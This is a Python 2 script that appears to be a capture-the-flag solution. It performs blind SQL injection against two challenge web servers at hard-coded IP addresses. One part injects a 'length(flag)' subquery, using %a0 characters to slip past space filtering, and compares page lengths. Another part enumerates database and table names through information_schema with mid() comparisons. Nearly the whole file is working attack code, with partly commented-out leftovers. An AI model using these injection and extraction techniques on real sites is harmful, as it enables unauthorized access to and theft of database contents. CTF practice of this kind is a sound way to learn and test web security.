'''
@author: wenhuizone
http://218.245.4.113:8080/web04/60c2a013a6decbe0c5c2883080e6b332/index.php?id=1

'''
'''
'''
import urllib2  
import urllib  
import cookielib  
import string
 
'''
TARGET_URL = "http://218.245.4.113:8080/web04/60c2a013a6decbe0c5c2883080e6b332/index.php?id=0)||(select%a0length(flag)%a0from%a0flag)="
dic='d:/ssctfweb400.txt'
for i in range(1,40):
    url=TARGET_URL+str(i)+'%23'
    req = urllib2.Request(url)  
    cj = cookielib.CookieJar()   
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))   
    res = opener.open(req)    
    request = urllib2.Request(url)  
    response = opener.open(request)
    html=response.read()
    length=len(html)
    s="item: %s length: %d "%(i,length)
    print s

'''
'''
http://202.119.194.64/challenge/sqlsql/index.php?type=&query=,information_schema.schemata where type=1 and mid(schema_name,1,1)='a' group by schema_name limit 0,1
'''
TARGET_URL = "http://202.119.194.64/challenge/sqlsql/index.php?type=&query=,information_schema.schemata where type=1 and mid(schema_name,1,1)="
#result='jkschvkjasmznxvkjahsdasdxzcqw'
result=''
tmp=''
for ch in range(0,1):
    #url=TARGET_URL+"\'"+chr(ch)+"\' group by schema_name limit 0,1"
    url="http://202.119.194.64/challenge/sqlsql/index.php?type=1&query=,information_schema.tables where type=1 and mid(table_name,1,4)='newa' group by table_name limit 0,1"
    req = urllib2.Request(url)  
    cj = cookielib.CookieJar()   
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))   
    res = opener.open(req)    
    request = urllib2.Request(url)  
    response = opener.open(request)
    html=response.read()
    print html
    length=len(html)
    s="trying:item: %s length: %d "%(result+chr(ch),length)
    '''
    if length==464:
        result+=chr(ch)
        print s
        print "the flag is :"
        print result
        break
    #print url
    '''
    print s
